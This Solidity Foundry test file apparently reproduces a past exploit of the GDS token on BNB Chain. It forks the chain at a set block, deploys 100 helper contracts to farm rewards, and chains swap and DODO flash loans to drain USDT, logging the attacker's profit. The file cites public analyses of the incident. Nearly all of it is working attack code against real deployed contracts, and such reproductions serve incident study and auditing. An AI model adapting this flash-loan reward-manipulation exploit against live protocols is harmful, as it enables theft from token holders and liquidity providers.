// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/peckshield/status/1610095490368180224
// https://twitter.com/BlockSecTeam/status/1610167174978760704
// @TX
// https://bscscan.com/tx/0xf9b6cc083f6e0e41ce5e5dd65b294abf577ef47c7056d86315e5e53aa662251e
// https://bscscan.com/tx/0x2bb704e0d158594f7373ec6e53dc9da6c6639f269207da8dab883fc3b5bf6694

interface GDSToken is IERC20 {
    function pureUsdtToToken(uint256 _uAmount) external returns (uint256);
}

interface ISwapFlashLoan {
    function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;
}

interface IClaimReward {
    function transferToken() external;
    function withdraw() external;
}

contract ClaimReward {
    address Owner;
    GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4526C263571eb57110D161b41df8FD073Df3C44A);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address deadAddress = 0x000000000000000000000000000000000000dEaD;

    constructor() {
        Owner = msg.sender;
    }

    function transferToken() external {
        GDS.transfer(deadAddress, GDS.pureUsdtToToken(100 * 1e18));
        Pair.transfer(Owner, Pair.balanceOf(address(this)));
    }

    function withdraw() external {
        GDS.transfer(deadAddress, 10_000);
        Pair.transfer(Owner, Pair.balanceOf(address(this)));
        GDS.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(GDS);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            GDS.balanceOf(address(this)), 0, path, Owner, block.timestamp
        );
    }
}

contract ContractTest is Test {
    GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ISwapFlashLoan swapFlashLoan = ISwapFlashLoan(0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4526C263571eb57110D161b41df8FD073Df3C44A);
    address[] contractList;
    uint256 PerContractGDSAmount;
    uint256 SwapFlashLoanAmount;
    uint256 dodoFlashLoanAmount;
    address deadAddress = 0x000000000000000000000000000000000000dEaD;
    address dodo = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 24_449_918);
        cheats.label(address(GDS), "GDS");
        cheats.label(address(USDT), "USDT");
    }

    function testExploit() public {
        address(WBNB).call{value: 50 ether}("");
        WBNBToUSDT();
        USDTToGDS(10 * 1e18);
        GDSUSDTAddLiquidity(10 * 1e18, GDS.balanceOf(address(this)));
        USDTToGDS(USDT.balanceOf(address(this)));
        PerContractGDSAmount = GDS.balanceOf(address(this)) / 100;
        ClaimRewardFactory();

        cheats.roll(block.number + 1100);
        SwapFlashLoan();

        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)) - 50 * 250 * 1e18, USDT.decimals()
        );
    }

    function SwapFlashLoan() internal {
        SwapFlashLoanAmount = USDT.balanceOf(address(swapFlashLoan));
        swapFlashLoan.flashLoan(address(this), address(USDT), SwapFlashLoanAmount, new bytes(1));
    }

    function executeOperation(
        address pool,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata params
    ) external {
        DODOFLashLoan();
        USDT.transfer(address(swapFlashLoan), SwapFlashLoanAmount * 10_000 / 9992 + 1000);
    }

    function DODOFLashLoan() internal {
        dodoFlashLoanAmount = USDT.balanceOf(dodo);
        DVM(dodo).flashLoan(0, dodoFlashLoanAmount, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        USDTToGDS(600_000 * 1e18);
        GDSUSDTAddLiquidity(USDT.balanceOf(address(this)), GDS.balanceOf(address(this)));
        WithdrawRewardFactory();
        GDSUSDTRemovLiquidity();
        GDSToUSDT();
        USDT.transfer(dodo, dodoFlashLoanAmount);
    }

    function ClaimRewardFactory() internal {
        for (uint256 i = 0; i < 100; i++) {
            ClaimReward claim = new ClaimReward();
            contractList.push(address(claim));
            Pair.transfer(address(claim), Pair.balanceOf(address(this)));
            GDS.transfer(address(claim), PerContractGDSAmount);
            claim.transferToken();
        }
    }

    function WithdrawRewardFactory() internal {
        for (uint256 i = 0; i < 100; i++) {
            Pair.transfer(contractList[i], Pair.balanceOf(address(this)));
            IClaimReward(contractList[i]).withdraw();
        }
    }

    function WBNBToUSDT() internal {
        WBNB.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function USDTToGDS(uint256 USDTAmount) internal {
        USDT.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(GDS);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            USDTAmount, 0, path, address(this), block.timestamp
        );
    }

    function GDSUSDTAddLiquidity(uint256 USDTAmount, uint256 GDSAmount) internal {
        USDT.approve(address(Router), type(uint256).max);
        GDS.approve(address(Router), type(uint256).max);
        Router.addLiquidity(address(USDT), address(GDS), USDTAmount, GDSAmount, 0, 0, address(this), block.timestamp);
    }

    function GDSUSDTRemovLiquidity() internal {
        Pair.approve(address(Router), type(uint256).max);
        Router.removeLiquidity(
            address(USDT), address(GDS), Pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp
        );
    }

    function GDSToUSDT() internal {
        GDS.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(GDS);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            GDS.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
